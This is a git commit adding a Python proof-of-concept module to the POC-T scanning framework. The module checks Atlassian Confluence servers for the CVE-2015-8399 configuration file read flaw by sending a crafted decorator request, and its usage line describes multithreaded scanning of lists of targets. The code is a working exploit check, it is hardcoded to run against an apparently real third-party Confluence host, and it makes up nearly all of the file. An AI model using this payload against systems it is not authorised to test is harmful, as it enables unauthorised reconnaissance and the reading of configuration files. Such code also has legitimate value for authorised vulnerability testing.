5986055d44d2b52ba02c8a8d35df9194b8fcdac2
cdxy <xyntax@163.com>
2016-05-07 17:47:13 +0800

    添加conference文件读取POC

---
+++ module/confluence-file-read.py
@@ -0,0 +1,43 @@
+# coding:utf8
+__author__ = 'xy'
+
+import requests, time
+
+infostr = """
+Atlassian Confluence config file read POC [CVE-2015-8399]
+
+reference:
+http://zone.wooyun.org/content/27104
+http://www.cnnvd.org.cn/vulnerability/show/cv_id/2016010311
+https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-8399
+
+cdxy  May 7 Sat, 2016
+
+usage:python POC-T.py -T -m confluence-file-read -f [path/targetfile] -t [thread-num]
+
+"""
+
+
+def info():
+    return infostr
+
+
+def exp():
+    pass
+
+
+def poc(inp):
+    try:
+        payloads = ['/spaces/viewdefaultdecorator.action?decoratorName=']
+        for each in payloads:
+            if '.properties' in requests.get(url=inp + each).content:
+                return True
+        else:
+            return False
+    except Exception, e:
+        return False
+
+
+if __name__ == '__main__':
+    print info()
+    print poc('http://confluence.unlimax.com/')
